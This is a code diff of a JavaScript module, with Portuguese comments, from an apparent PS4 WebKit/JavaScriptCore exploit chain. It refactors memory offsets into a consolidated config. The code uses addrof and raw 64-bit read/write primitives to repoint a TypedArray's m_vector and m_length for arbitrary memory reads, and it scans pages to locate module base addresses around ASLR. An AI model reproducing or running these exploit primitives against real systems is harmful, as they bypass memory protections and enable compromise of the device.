@@ -1,14 +1,13 @@
-//module/memtools.mjs
+//module/memtools.mjs (ATUALIZADO)
 
 // Este módulo contém utilitários que dependem da execução inicial do exploit.
 
 import { Int } from './int64.mjs'; // Importa Int para manipulação de inteiros de 64 bits
 import { mem } from './mem.mjs'; // Importa a instância global de Memory
 import { align } from './utils.mjs'; // Importa a função align de utils.mjs
-import { page_size } from './offset.mjs'; // Importa o tamanho da página
+import { JSC_OFFSETS } from '../config.mjs'; // ADICIONADO: Importa do config consolidado
 import { BufferView } from './rw.mjs'; // Importa BufferView para manipulação de buffers
 import { View1 } from './view.mjs'; // Importa View1 para manipulação de arrays de 8 bits
-import * as off from './offset.mjs'; // Importa todos os offsets
 
 // Cria um ArrayBuffer cujo conteúdo é copiado de um endereço de memória arbitrária.
 export function make_buffer(addr, size) {
@@ -20,12 +19,12 @@ export function make_buffer(addr, size) {
     const u_addr = mem.addrof(u); // Obtém o endereço do TypedArray no heap JS.
 
     // Salva o endereço original do vetor e o tamanho.
-    const old_addr = u_addr.read64(off.view_m_vector);
-    const old_size = u_addr.read32(off.view_m_length);
+    const old_addr = u_addr.read64(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
+    const old_size = u_addr.read32(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET);
 
     // Sobrescreve o m_vector e m_length do TypedArray para apontar para o endereço e tamanho desejados.
-    u_addr.write64(off.view_m_vector, addr);
-    u_addr.write32(off.view_m_length, size);
+    u_addr.write64(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, addr);
+    u_addr.write32(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, size);
 
     const copy = new Uint8Array(u.length); // Cria uma cópia do conteúdo do TypedArray.
     copy.set(u); // Copia os dados.
@@ -39,8 +38,8 @@ export function make_buffer(addr, size) {
     const res = copy.buffer; // O ArrayBuffer resultante contém os dados do endereço arbitrário.
 
     // Restaura o m_vector e m_length do TypedArray original.
-    u_addr.write64(off.view_m_vector, old_addr);
-    u_addr.write32(off.view_m_length, old_size);
+    u_addr.write64(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, old_addr);
+    u_addr.write32(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, old_size);
 
     return res;
 }
@@ -70,6 +69,7 @@ function check_magic_at(p, is_text) {
 // Usado no PS4 para localizar endereços base de módulos.
 // Módulos são provavelmente separados por páginas não mapeadas devido ao ASLR.
 export function find_base(addr, is_text, is_back) {
+    const page_size = 16 * 1024; // 16KB
     // Alinha ao tamanho da página.
     addr = align(addr, page_size);
     const offset = (is_back ? -1 : 1) * page_size; // Define o passo da busca.
@@ -88,7 +88,7 @@ export function get_view_vector(view) {
         throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
     }
     // Retorna o endereço do m_vector do JSC::JSArrayBufferView.
-    return mem.addrof(view).readp(off.view_m_vector);
+    return mem.addrof(view).readp(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
 }
 
 // Resolve o endereço de uma função importada através do seu stub de importação.
